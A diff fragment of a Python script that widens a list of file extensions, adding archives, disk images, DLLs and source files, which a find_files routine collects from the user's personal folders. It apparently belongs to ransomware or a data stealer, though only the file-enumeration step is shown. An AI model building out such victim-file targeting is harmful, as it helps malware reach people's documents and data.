@@ -11,7 +11,7 @@ filelimit = 1024 * 1024 # 1 GB
 
 def find_files(mode="E"):
     allFiles = []
-    valid_extensions = ["exe", "doc", "docx", "html", "htm", "odt", "pdf", "xls", "xlsx", "ods", "ppt", "pptx", "txt", "jpeg", "jpg", "png", "gif", "tiff", "psd", "eps", "ai", "indd", "raw", "bmp", "webp", "bat", "svg", "mp4", "avi", "mov", "flv", "wmv", "mpg", "pcm", "wav", "aiff", "mp3", "ogg", "aac", "wma", "flac", "alac", "wma", "zip", "rar", "csv", "torrent", "sqlite3", "sqlite", "db", "sql", "accdb", "sln", "suo", "cpp", "c", "cmd", "php", "java", "jar", "mpeg", "mov", "3gp", "mkv", "psd", "bak", "key"]
+    valid_extensions = ["exe", "doc", "docx", "html", "htm", "odt", "pdf", "xls", "xlsx", "ods", "ppt", "pptx", "txt", "jpeg", "jpg", "png", "gif", "tiff", "psd", "eps", "ai", "indd", "raw", "bmp", "webp", "bat", "svg", "mp4", "avi", "mov", "flv", "wmv", "mpg", "pcm", "wav", "aiff", "mp3", "ogg", "aac", "wma", "flac", "alac", "wma", "zip", "rar", "csv", "torrent", "sqlite3", "sqlite", "db", "sql", "accdb", "sln", "suo", "cpp", "c", "cmd", "php", "java", "jar", "mpeg", "mov", "3gp", "mkv", "psd", "bak", "key", "7z", "iso", "bin", "dat", "log", "dbf", "tar", "xml", "py", "rb", "js", "md", "class", "cs", "h", "dll", "mkv" , "mid"]
     allowed_dirs = ["Desktop", "Documents", "Downloads", "Music", "Videos", "Pictures"]
     username = os.path.expanduser("~")
     for dirs in allowed_dirs:
